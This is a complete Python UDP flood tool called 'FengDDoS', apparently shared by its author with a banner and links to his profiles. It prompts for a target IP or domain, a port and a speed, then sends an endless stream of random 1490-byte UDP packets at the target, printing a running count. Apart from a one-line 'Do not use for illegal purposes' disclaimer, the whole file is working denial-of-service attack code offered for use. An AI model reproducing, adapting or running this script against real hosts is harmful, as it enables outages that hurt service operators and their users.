# python3
import sys
import os
import time
import socket
import random
from datetime import datetime
from socket import gethostbyname 

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

def show_banner():
    """将启动界面封装成函数"""
    os.system("clear")
    os.system("figlet FengDDoS")
    print (" ")
    print ("---------------------------------------------------")
    print (" Author : FengPwner ")
    print (" Github : https://github.com/FengPwner ")
    print (" Atomgit : https://atomgit.com/FengPwner ")
    print (" CSDN : https://blog.csdn.net/2302_76189356 ")
    print (" Version : 0.3.6 (Modified) ")
    print ("---------------------------------------------------")
    print (" To update, please use `git pull` ")
    print ("---------------------------------------------------")
    print (" ")
    print (" -----------------[Do not use for illegal purposes]----------------- ")
    print (" ")

def handle_error(allow_edit=True):
    """统一的错误交互处理"""
    while True:
        if allow_edit:
            choice = input("[?] Return to menu (y), Exit (n), or Edit (e): ").strip().lower()
            if choice == 'y':
                return 'y'
            elif choice == 'n':
                print("[*] Exiting script. Goodbye!")
                sys.exit(0)
            elif choice == 'e':
                return 'e'
            else:
                print("[-] Invalid input. Please enter 'y', 'n', or 'e'.")
        else:
            # 当不允许编辑时（如Ctrl+C中断），只提示 y 和 n
            choice = input("[?] Return to menu (y) or Exit (n): ").strip().lower()
            if choice == 'y':
                return 'y'
            elif choice == 'n':
                print("[*] Exiting script. Goodbye!")
                sys.exit(0)
            else:
                print("[-] Invalid input. Please enter 'y' or 'n'.")

# 主循环：用于支持“返回界面”功能
while True:
    show_banner()

    # --- 1. 目标 IP/域名 解析 ---
    while True:
        target = input("IP or Domain (type 'exit' to quit): ")
        if target.strip().lower() == 'exit':
            print("[*] Exiting script. Goodbye!")
            sys.exit(0)
        try:
            ip = gethostbyname(target)
            print(f"[+] Resolved target to IP: {ip}")
            break  # 解析成功，跳出当前循环
        except socket.gaierror:
            print("[-] Error: Could not resolve the specified IP or Domain.")
            action = handle_error(allow_edit=True) # 输入错误时允许编辑
            if action == 'y': 
                break  # 跳出IP输入循环，回到主菜单
            elif action == 'e': 
                continue  # 重新输入IP

    # 如果用户选择了返回主菜单，跳过后续步骤
    if 'ip' not in locals() or target.strip().lower() == 'exit': 
        continue 

    # --- 2. 端口输入与校验 ---
    while True:
        port_input = input("port (1-65535, type 'exit' to quit): ")
        if port_input.strip().lower() == 'exit':
            print("[*] Exiting script. Goodbye!")
            sys.exit(0)
        try:
            port = int(port_input)
            if not (1 <= port <= 65535):
                raise ValueError("Port out of range")
            break  # 校验成功，跳出当前循环
        except ValueError:
            print("[-] Error: Invalid port. Please enter a number between 1 and 65535.")
            action = handle_error(allow_edit=True) # 输入错误时允许编辑
            if action == 'y': 
                break  # 跳出端口输入循环，回到主菜单
            elif action == 'e': 
                continue  # 重新输入端口

    # 检查是否选择了返回主菜单
    if 'port' not in locals(): 
        continue 

    # --- 3. 速度输入与校验 ---
    while True:
        sd_input = input("speed (1~1000, type 'exit' to quit): ")
        if sd_input.strip().lower() == 'exit':
            print("[*] Exiting script. Goodbye!")
            sys.exit(0)
        try:
            sd = int(sd_input)
            if not (1 <= sd <= 1000):
                raise ValueError("Speed out of range")
            break  # 校验成功，跳出当前循环
        except ValueError:
            print("[-] Error: Invalid speed. Please enter a number between 1 and 1000.")
            action = handle_error(allow_edit=True) # 输入错误时允许编辑
            if action == 'y': 
                break  # 跳出速度输入循环，回到主菜单
            elif action == 'e': 
                continue  # 重新输入速度

    # 检查是否选择了返回主菜单
    if 'sd' not in locals(): 
        continue 

    # --- 4. 开始发包 ---
    os.system("clear")
    sent = 0
    print("[*] Attack started... Press Ctrl+C to stop.")
    try:
        while True:
            sock.sendto(bytes, (ip, port))
            sent = sent + 1
            print("Sent %s data packet to %s port %d" % (sent, ip, port))
            time.sleep((1000 - sd) / 2000)

    except KeyboardInterrupt:
        print("\n\n[!] Attack interrupted by user.")
        # Ctrl+C 中断时，不允许编辑，只允许返回菜单或退出
        action = handle_error(allow_edit=False) 
        if action == 'y': 
            continue  # 回到主菜单
        # 如果选择 n，handle_error 内部已经退出
